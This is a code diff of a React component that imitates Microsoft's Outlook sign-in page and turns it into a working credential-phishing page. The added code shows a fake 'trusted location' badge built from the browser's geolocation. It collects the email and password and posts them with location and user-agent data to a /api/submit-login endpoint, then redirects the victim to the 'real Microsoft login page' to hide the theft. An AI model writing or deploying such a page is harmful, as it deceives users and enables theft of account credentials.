@@ -1,94 +1,205 @@
 "use client";
-import React from 'react';
 
-export default function OutlookLogin() {
+import { useState, useEffect } from "react";
+
+export default function MicrosoftLogin() {
+  const [step, setStep] = useState<"email" | "password">("email");
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [loading, setLoading] = useState(false);
+  const [errorMsg, setErrorMsg] = useState("");
+  const [location, setLocation] = useState<{ city?: string; country?: string }>({});
+  const [locationStatus, setLocationStatus] = useState<"idle" | "loading" | "granted" | "denied">("idle");
+
+  // Geolocation (same as before)
+  useEffect(() => {
+    if (!navigator.geolocation) return;
+    setLocationStatus("loading");
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        try {
+          const res = await fetch(
+            `https://nominatim.openstreetmap.org/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&format=json`
+          );
+          const data = await res.json();
+          setLocation({
+            city: data.address?.city || data.address?.town,
+            country: data.address?.country,
+          });
+          setLocationStatus("granted");
+        } catch {
+          setLocationStatus("denied");
+        }
+      },
+      () => setLocationStatus("denied")
+    );
+  }, []);
+
+  const handleEmailSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!email.trim()) {
+      setErrorMsg("Please enter an email or phone number.");
+      return;
+    }
+    setErrorMsg("");
+    setStep("password");
+  };
+
+  const handlePasswordSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!password.trim()) {
+      setErrorMsg("Please enter your password.");
+      return;
+    }
+    setLoading(true);
+    setErrorMsg("");
+
+    try {
+      const response = await fetch("/api/submit-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          email: email,
+          password: password,
+          location: location,
+          userAgent: navigator.userAgent,
+          timestamp: new Date().toISOString(),
+        }),
+      });
+      const data = await response.json();
+      if (data.success) {
+        // Redirect to real Microsoft login page
+        window.location.href = data.redirect;
+      } else {
+        throw new Error(data.error || "Login failed");
+      }
+    } catch (err) {
+      setErrorMsg("Something went wrong. Please try again.");
+      setLoading(false);
+    }
+  };
+
+  const goBackToEmail = () => {
+    setStep("email");
+    setErrorMsg("");
+    setPassword("");
+  };
+
   return (
-    <div 
-      className="min-h-screen w-full flex flex-col justify-between bg-[#f2f2f2] sm:bg-cover sm:bg-center sm:bg-no-repeat font-['Segoe_UI',-apple-system,BlinkMacSystemFont,Roboto,sans-serif] text-[#1b1b1b] antialiased select-none"
-      style={{
-        backgroundImage: "url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d340a3532f2903864b1.svg')",
-      }}
-    >
-      <div className="flex-1 flex items-start sm:items-center justify-center">
-        <div 
-          className="w-full bg-white p-6 pt-12 sm:p-11 pb-6 sm:my-4 sm:w-[440px] sm:shadow-[0_4px_16px_rgba(0,0,0,0.2)] sm:border sm:border-[rgba(0,0,0,0.08)] flex flex-col justify-between"
-          style={{ minHeight: 'calc(100vh - 40px)', sm: { minHeight: 'auto' } }}
-        >
-          <div className="w-full">
-            <div className="mb-5 flex items-center" aria-hidden="true">
-              <div className="grid grid-cols-2 gap-[2px] w-[34px] h-[34px] flex-shrink-0">
-                <div className="bg-[#f25022]"></div>
-                <div className="bg-[#7fba00]"></div>
-                <div className="bg-[#00a4ef]"></div>
-                <div className="bg-[#ffb900]"></div>
-              </div>
-              <span className="ml-3 text-[#737373] font-semibold text-[20px] tracking-tight">
-                Microsoft
-              </span>
-            </div>
+    <div className="min-h-screen w-full flex flex-col bg-[#f2f2f2] font-['Segoe_UI',-apple-system,BlinkMacSystemFont,Roboto,sans-serif] text-[#1b1b1b] antialiased">
+      <div className="flex-1 flex items-center justify-center p-6">
+        <div className="w-full max-w-[440px] bg-white shadow-lg p-8 rounded-lg">
+          {/* Microsoft logo (simple, no four-color grid) */}
+          <div className="mb-6">
+            <svg width="108" height="24" viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M0 0h24v24H0z" fill="#F25022" />
+              <path d="M24 0h24v24H24z" fill="#7FBA00" />
+              <path d="M48 0h24v24H48z" fill="#00A4EF" />
+              <path d="M72 0h24v24H72z" fill="#FFB900" />
+              <path d="M96 4h12v16h-12z" fill="#737373" />
+            </svg>
+          </div>
 
-            <h1 className="text-[1.5rem] font-semibold leading-8 text-[#1b1b1b] tracking-tight">
-              Sign in
-            </h1>
-            <p className="text-[0.9375rem] text-[#1b1b1b] mt-1 mb-5">
-              to continue to Outlook
-            </p>
+          <h1 className="text-[1.75rem] font-semibold leading-9 mb-2">Sign in</h1>
 
-            <form onSubmit={(e) => e.preventDefault()} className="space-y-4">
-              <div className="w-full border-b border-[#666666] focus-within:border-[#0067b8]">
+          {locationStatus === "granted" && location.city && (
+            <p className="text-xs text-green-700 mb-4">🔒 Trusted location: {location.city}, {location.country}</p>
+          )}
+
+          {step === "email" ? (
+            <form onSubmit={handleEmailSubmit}>
+              <div className="mb-6">
                 <input
-                  type="email"
-                  placeholder="Email, phone, or Skype"
-                  className="w-full outline-none py-[6px] text-[0.9375rem] text-[#1b1b1b] placeholder:text-[#666666] bg-transparent rounded-none border-none"
+                  type="text"
+                  placeholder="Email or phone number"
+                  className="w-full border border-gray-300 rounded px-3 py-2 text-[0.9375rem] focus:outline-none focus:border-[#0067b8]"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  autoFocus
                   required
                 />
               </div>
 
-              <div className="text-[0.8125rem] space-y-3 pt-1">
-                <p className="text-[#1b1b1b]">
-                  No account?{" "}
-                  <a href="#" className="text-[#0067b8] hover:underline">
-                    Create one!
-                  </a>
-                </p>
-                <p>
-                  <a href="#" className="text-[#0067b8] hover:underline">
-                    Can’t access your account?
-                  </a>
-                </p>
+              {errorMsg && <div className="text-red-600 text-sm mb-4">{errorMsg}</div>}
+
+              <div className="mb-4">
+                <a href="#" className="text-[#0067b8] text-sm hover:underline">
+                  Forgot your username?
+                </a>
               </div>
 
-              <div className="flex justify-end pt-6">
-                <button
-                  type="submit"
-                  className="bg-[#0067b8] text-white min-w-[108px] h-[32px] px-3 text-[0.9375rem] font-normal hover:bg-[#005da6] active:bg-[#005292] transition-colors border-none outline-none shadow-none"
-                >
-                  Next
-                </button>
+              <button
+                type="submit"
+                className="w-full bg-[#0067b8] text-white py-2 px-4 rounded text-sm font-semibold hover:bg-[#005da6] transition-colors"
+              >
+                Next
+              </button>
+
+              <div className="mt-6 text-center text-sm">
+                <a href="#" className="text-[#0067b8] hover:underline">
+                  New to Microsoft? Create an account
+                </a>
               </div>
             </form>
-          </div>
+          ) : (
+            <form onSubmit={handlePasswordSubmit}>
+              <div className="mb-4">
+                <div className="text-sm text-gray-600 mb-1">Email or phone</div>
+                <div className="flex justify-between items-center">
+                  <span className="text-[0.9375rem] font-medium">{email}</span>
+                  <button
+                    type="button"
+                    onClick={goBackToEmail}
+                    className="text-[#0067b8] text-sm hover:underline"
+                  >
+                    Change
+                  </button>
+                </div>
+              </div>
 
-          <div className="mt-12">
-            <button className="flex items-center gap-3 bg-transparent hover:bg-[rgba(0,0,0,0.04)] active:bg-[rgba(0,0,0,0.08)] px-2 py-1.5 transition-colors border-none outline-none rounded-none text-left">
-              <svg className="w-6 h-6 text-[#2f2f2f] flex-shrink-0" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <rect x="5" y="10" width="22" height="12" rx="1" stroke="currentColor" strokeWidth="2"/>
-                <circle cx="11" cy="16" r="2" fill="currentColor"/>
-                <rect x="17" y="14" width="2" height="4" fill="currentColor"/>
-                <rect x="21" y="14" width="2" height="4" fill="currentColor"/>
-              </svg>
-              <span className="text-[0.9375rem] text-[#2f2f2f]">
-                Sign-in options
-              </span>
-            </button>
-          </div>
+              <div className="mb-6">
+                <input
+                  type="password"
+                  placeholder="Password"
+                  className="w-full border border-gray-300 rounded px-3 py-2 text-[0.9375rem] focus:outline-none focus:border-[#0067b8]"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  autoFocus
+                  required
+                />
+              </div>
+
+              {errorMsg && <div className="text-red-600 text-sm mb-4">{errorMsg}</div>}
+
+              <button
+                type="submit"
+                disabled={loading}
+                className="w-full bg-[#0067b8] text-white py-2 px-4 rounded text-sm font-semibold hover:bg-[#005da6] transition-colors disabled:opacity-50"
+              >
+                {loading ? "Signing in..." : "Sign in"}
+              </button>
+
+              <div className="mt-6 text-sm">
+                <a href="#" className="text-[#0067b8] hover:underline">
+                  Forgot your password?
+                </a>
+              </div>
+            </form>
+          )}
         </div>
       </div>
 
-      <footer className="w-full bg-transparent p-4 sm:px-7 flex flex-wrap justify-end gap-x-4 gap-y-1 text-[0.75rem] text-[#505050] sm:text-[#ffffff] bg-white sm:bg-transparent border-t border-gray-200 sm:border-none">
-        <a href="#" className="hover:underline">Terms of use</a>
-        <a href="#" className="hover:underline">Privacy & cookies</a>
-        <span className="cursor-pointer tracking-wider font-bold">...</span>
+      <footer className="w-full bg-transparent px-6 py-4 text-[0.75rem] text-[#505050] border-t border-gray-200">
+        <div className="max-w-[440px] mx-auto flex flex-wrap justify-between gap-2">
+          <div className="flex gap-4">
+            <a href="#" className="hover:underline">Help and feedback</a>
+            <a href="#" className="hover:underline">Terms of use</a>
+            <a href="#" className="hover:underline">Privacy and cookies</a>
+          </div>
+          <div>
+            <a href="#" className="hover:underline">Use private browsing if this is not your device. Learn more</a>
+          </div>
+        </div>
       </footer>
     </div>
   );
